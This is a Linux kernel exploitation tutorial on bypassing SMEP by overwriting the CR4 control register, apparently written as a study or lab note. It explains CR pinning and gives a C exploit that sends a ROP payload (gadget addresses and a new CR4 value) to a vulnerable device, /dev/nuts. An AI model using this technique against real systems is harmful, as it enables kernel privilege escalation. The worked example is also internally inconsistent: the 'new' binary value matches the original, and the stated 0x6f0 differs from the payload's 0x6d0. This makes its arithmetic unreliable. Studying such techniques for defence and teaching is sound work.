# Overwrite CR4

---

## Theory

- **Overwriting the CR4 control register** is a solution to **disable SMEP** protection on **older kernel versions**.

- Remember that if the **20th bit of the control register CR4 is set to 1**, the **SMEP protection** is **activated** :

<p align="center">
  <img src="https://i.imgur.com/tdHy6Sh.png">
</p>

- The register is completed by using a kernel symbols called `native_write_cr4()`, it's this function that allows to define the activation of the protection such as SMEP, SMAP... It means that to bypass SMEP it will be necessary to assign a value to it so that the 20bit of the register is not any more has 1 but has 0.

- This technique is feasible on older kernel versions but newer versions fix the 20th and 21st bit of CR4 when it's rewritten using a feature called [Paravirtualized Control Register pinning](https://lwn.net/Articles/807904/), we can check it in the [source code of our kernel](https://elixir.bootlin.com/linux/v4.10.3/A/ident/native_write_cr4).
	
__CR pinning no enabled__ :

```c
asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");
```

__CR pinning enabled__ :

```c
void native_write_cr4(unsigned long val)
{
	unsigned long bits_changed = 0;

set_register:
	asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");

	if (static_branch_likely(&cr_pinning)) {
		if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
			bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
			val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
			goto set_register;
		}
		/* Warn after we've corrected the changed bits. */
		WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
			  bits_changed);
	}
}
```

## Practice

First of all we have to find 2 gadgets that will allow us to write a new value to the CR4 control register :

- `mov cr4, reg ; ret`
- `pop reg ; ret`

Then we have to recover the value of the unmodified CR4 by debugging the kernel or simply by looking at the logs during a segmentation fault. For our example, let's take the value `0x1006f0`.

Converted to binary this value becomes :

```py
gefâž¤  p/t 0x1006f0
$1 = 100000000011011110000
```

The 20th bit from zero is set to 1.

Our new value will then be : `100000000011011110000`, which gives in hexadecimal : `0x6f0`.

Here is our exploit (note that only the CR4 overwrite is done in this script, the ret2usr part, retrieving addresses from `commit_creds(prepare_kernel_cred(0))` is not done below) :

```c
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

int fd;

int open_fd_device(void)
{
    fd = open("/dev/nuts", O_RDWR);
    if (fd < 0) {
        printf("[x] Error openning the FD");
        return -1;
    } else
        printf("[+] File descriptor is open\n");
}

int main(void)
{
    unsigned char payload[] = 
    "AAAAAAAAAAAAAAAA" // offset to reach eip
    "\x65\x25\x07\x4b"  // pop reg ; ret
    "\xd0\x06\x00\x00"  // 0x000006d0 = new value for CR4 register
    "\x84\x24\x03\xa8"  // mov cr4, reg ; ret
    "\xef\xbe\xad\xde"; // Continue ROP Chain

    open_fd_device();
    write(fd, payload, sizeof(payload));
}

// gcc -static -m32 exploit.c -o exploit
```

## References

+ **EN**
  - https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#the-attempt-to-overwrite-cr4
  - https://defaultsec.eu/articles/Articles%20b670077918604977ab9c1314f698cab5/Linux%20Kernel%20Exploitation%20fbaef51c6910418a92220e950a2bfac5/Linux%20Kernel%20Exploitation%20-%20ROP%20(part2)%2046ed183bf1894e928e82cbc81f8df4fc.html#4be6db8d-1a77-48ad-ae54-1a91177a300a
  - https://www.abatchy.com/2018/01/kernel-exploitation-4
  - https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html
  - https://fr.slideshare.net/VitalyNikolenko/linux-smep-bypass-techniques
